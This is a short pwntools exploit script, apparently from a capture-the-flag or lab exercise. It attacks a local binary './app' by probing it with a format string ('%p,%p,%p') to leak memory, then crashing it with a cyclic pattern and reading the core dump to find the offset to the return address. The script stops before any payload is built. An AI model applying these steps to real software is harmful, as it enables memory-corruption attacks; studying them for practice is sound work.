from pwn import *
if __name__== '__main__':
	io=process('./app')
	print(io.recvregex(b':'))

	io.sendline(b'%p,%p,%p')
	io.recvline()
	print(io.recvline())
	io.sendline(cyclic(500))
	io.wait()

	core=io.corefile
	stack=core.rsp
	info("rsp = %#x",stack)
	pattern = core.read(stack,4)
	rip_offset=cyclic_find(pattern)


	
